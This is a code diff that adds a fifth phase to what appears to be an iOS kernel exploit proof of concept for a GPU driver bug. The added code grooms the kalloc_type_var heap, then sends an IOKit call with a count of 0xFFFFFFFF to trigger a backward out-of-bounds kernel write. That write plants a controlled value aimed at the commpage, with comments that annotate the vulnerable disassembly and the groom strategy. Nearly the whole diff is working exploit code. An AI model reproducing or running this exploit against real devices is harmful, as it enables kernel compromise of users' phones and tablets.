@@ -448,6 +448,110 @@ static void trigger_phase4(io_connect_t conn) {
     evf("[P4] DONE — if device panics now, check IPS for GPR=0x%016llx", COMMPAGE_FLAG);
 }
 
+/*
+ * trigger_phase5: F-109 backward OOB via SGAR count=0xFFFFFFFF (-1 signed).
+ *
+ * F-109 path (from 26.5 KC function at 0xfffffe0009c05a84):
+ *   ldrsw x8, [obj, #0x424]       ; signed load: count=0xFFFFFFFF -> x8=-1
+ *   smull x10, w8, #element_size  ; -1 * 24 = -24
+ *   add x10, x10, #8              ; -24 + 8 = -16 (alloc_size)
+ *   IOMallocTypeVar(size=-16) -> alloc_ptr (kalloc_type_var zone)
+ *   str w19, [alloc_ptr - 16]     ; writes 4 controlled bytes 16B before alloc
+ *   strb w8, [alloc_ptr - 8]      ; writes 1 byte 8B before alloc
+ *
+ * Strategy:
+ *   1. Groom: create GROOM_COUNT groups with count=15 each in kalloc_type_var.
+ *      If count=15 is stored at offset 12 of the 24B element:
+ *      preceding_element[12..15] = 0x0000000F
+ *   2. Trigger: SGAR count=0xFFFFFFFF with struct[0x28..0x2B]=0xFFFFC330 (=w19).
+ *      If F-109 fires: writes 0xFFFFC330 at preceding_element[8..11].
+ *      Combined: 8-byte value at preceding_element[8..15] = 0x0000000FFFFFC330
+ *                = COMMPAGE_FLAG.
+ *   3. Observation: if device panics with FAR/PC near 0x0000000FFFFFC330 -> F-74 chain
+ *      reached. Check IPS for COMMPAGE_FLAG in registers.
+ *
+ * Note: OOB_EXACT variant (struct[0x28..0x2F] = COMMPAGE_FLAG 8 bytes) also tested —
+ * writes both 4-byte halves if F-109 writes 8 bytes instead of 4.
+ */
+#define P5_GROOM_COUNT  2048
+#define P5_GROOM_RCOUNT 15   /* count=15 -> offset 12 = 0x0F if stored there */
+
+static void trigger_phase5(io_connect_t conn) {
+    evf("[P5] START: F-109 backward OOB test (count=0xFFFFFFFF, 24B entry format)");
+
+    /* Phase 5a: groom kalloc_type_var zone with count=15 groups */
+    uint32_t p5_groom[P5_GROOM_COUNT];
+    int p5_valid = 0;
+    for (int gi = 0; gi < P5_GROOM_COUNT; gi++) {
+        uint64_t g = try_sgar_q(conn, P5_GROOM_RCOUNT);
+        if (g) p5_groom[p5_valid++] = (uint32_t)g;
+    }
+    evf("[P5] GROOM: %d/%d count=15 groups created", p5_valid, P5_GROOM_COUNT);
+
+    /* Baseline sel=7 on all groom groups */
+    int b5_ok = 0, b5_fail = 0;
+    for (int gi = 0; gi < p5_valid; gi++) {
+        kern_return_t bkr = try_sel7_q(conn, p5_groom[gi]);
+        if (bkr == 0) b5_ok++; else b5_fail++;
+    }
+    evf("[P5] BASELINE: kr=0->%d kr!=0->%d", b5_ok, b5_fail);
+
+    /* Phase 5b: trigger F-109 — count=0xFFFFFFFF (-1 signed), 24-byte entry format.
+     * struct[0x28..0x2B] = 0xFFFFC330 -> w19 = 0xFFFFC330 (if this becomes the write val).
+     * OOB_EXACT: struct[0x28..0x2F] = COMMPAGE_FLAG (8 bytes) in case write is 8B not 4B. */
+    static uint8_t p5_struct[SGAR_STRUCT_SIZE];
+    uint8_t p5_out[0x10]; size_t p5_out_sz = sizeof(p5_out); uint32_t p5_cnt = 0;
+    memset(p5_struct, 0, sizeof(p5_struct));
+    *(uint32_t *)(p5_struct + SGAR_COUNT_OFFSET) = 0xFFFFFFFFu;  /* count = -1 signed */
+    /* 24-byte entry format: each entry has first 4B = resource_id, rest = metadata */
+    for (uint32_t off = 0x28; off + 24 <= SGAR_STRUCT_SIZE; off += 24) {
+        /* Entry first 4B = 0xFFFFC330 (= w_val candidate for backward write) */
+        *(uint32_t *)(p5_struct + off) = 0xFFFFC330u;
+        /* Entry bytes 4-11 = COMMPAGE_FLAG (in case 8-byte write is used) */
+        *(uint64_t *)(p5_struct + off + 4) = COMMPAGE_FLAG;
+    }
+    /* Also set struct[0x28..0x2F] = COMMPAGE_FLAG directly (4+4 split) */
+    *(uint32_t *)(p5_struct + 0x28) = 0xFFFFC330u;     /* lower 32 bits */
+    *(uint32_t *)(p5_struct + 0x2C) = 0x0000000Fu;     /* upper 32 bits -> COMMPAGE_FLAG */
+
+    kern_return_t p5kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
+        NULL, 0, p5_struct, sizeof(p5_struct), NULL, &p5_cnt, p5_out, &p5_out_sz);
+    uint64_t p5_gid = (p5kr == 0) ? *(uint64_t *)p5_out : 0;
+    evf("[P5] F109_TRIGGER count=0xFFFFFFFF kr=0x%x gid=0x%llx", p5kr, p5_gid);
+
+    /* Phase 5c: check groom groups for anomaly (sel=7 count mismatch = forward corruption).
+     * F-109 backward OOB hits preceding_element[8..11], not count@[0..3].
+     * So sel=7 detection won't catch F-109. Instead we watch for device panic. */
+    int p5_post_ok = 0, p5_post_fail = 0;
+    uint32_t p5_first_bad = 0;
+    for (int gi = 0; gi < p5_valid; gi++) {
+        kern_return_t pkr = try_sel7_q(conn, p5_groom[gi]);
+        if (pkr == 0) p5_post_ok++;
+        else { p5_post_fail++; if (!p5_first_bad) p5_first_bad = p5_groom[gi]; }
+    }
+    evf("[P5] POST: kr=0->%d kr!=0->%d first_bad=0x%x", p5_post_ok, p5_post_fail, p5_first_bad);
+
+    /* Phase 5d: variant with 4-byte entry format (element_size=4 path), count=-1.
+     * alloc_size = (-1*4)+8 = 4 bytes. str w19, [alloc-16] = writes to alloc[-16].
+     * alloc[-16] is 16 bytes before the 4-byte allocation -> different zone offset. */
+    {
+        static uint8_t p5b_struct[SGAR_STRUCT_SIZE];
+        uint8_t p5b_out[0x10]; size_t p5b_out_sz = sizeof(p5b_out); uint32_t p5b_cnt = 0;
+        memset(p5b_struct, 0, sizeof(p5b_struct));
+        *(uint32_t *)(p5b_struct + SGAR_COUNT_OFFSET) = 0xFFFFFFFFu;
+        /* 4-byte entry format: pack 0xFFFFC330 at every 4-byte slot */
+        for (uint32_t off = 0x28; off + 4 <= SGAR_STRUCT_SIZE; off += 4)
+            *(uint32_t *)(p5b_struct + off) = 0xFFFFC330u;
+        kern_return_t p5bkr = IOConnectCallMethod(conn, SGAR_SELECTOR,
+            NULL, 0, p5b_struct, sizeof(p5b_struct), NULL, &p5b_cnt, p5b_out, &p5b_out_sz);
+        uint64_t p5b_gid = (p5bkr == 0) ? *(uint64_t *)p5b_out : 0;
+        evf("[P5] F109_4B count=0xFFFFFFFF 4B-fmt kr=0x%x gid=0x%llx", p5bkr, p5b_gid);
+    }
+
+    evf("[P5] DONE — watch for panic with GPR=0x%016llx or FAR near commpage", COMMPAGE_FLAG);
+    evf("[P5] DONE — if no panic: F-109 path not triggered by SGAR count=-1 -> check other selectors");
+}
+
 static void trigger_bof_iokit(void) {
     evf("[BOF] IOKIT_START sel=%d struct=0x%x count_off=0x%x",
         SGAR_SELECTOR, SGAR_STRUCT_SIZE, SGAR_COUNT_OFFSET);
@@ -626,6 +730,34 @@ void run_cve28882_poc(UIWindow *window) {
             } else {
                 evf("[P4] CONN4 failed: cannot open for Phase 4");
             }
+
+            /* Phase 5: F-109 backward OOB (count=0xFFFFFFFF -> kalloc_type_var write) */
+            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3*NSEC_PER_SEC),
+                           dispatch_get_main_queue(), ^{
+                mach_port_t mp5 = 0;
+                IOMasterPort(MACH_PORT_NULL, &mp5);
+                io_connect_t conn5 = 0;
+                const char *svc5[] = { "AGXAcceleratorG18P", "IOGPU", "AGXAccelerator", NULL };
+                for (int si = 0; svc5[si] && !conn5; si++) {
+                    CFMutableDictionaryRef m5 = IOServiceMatching(svc5[si]);
+                    io_iterator_t it5 = 0;
+                    IOServiceGetMatchingServices(mp5, m5, &it5);
+                    io_service_t sv5 = IOIteratorNext(it5);
+                    IOObjectRelease(it5);
+                    if (!sv5) continue;
+                    kern_return_t kr5 = IOServiceOpen(sv5, mach_task_self(), 1, &conn5);
+                    IOObjectRelease(sv5);
+                    if (kr5 != 0) conn5 = 0;
+                }
+                if (conn5) {
+                    evf("[P5] CONN5 ready=0x%x", conn5);
+                    trigger_phase5(conn5);
+                    IOServiceClose(conn5);
+                    evf("[P5] CONN5 closed");
+                } else {
+                    evf("[P5] CONN5 failed: cannot open for Phase 5");
+                }
+            });
         });
     });
 }
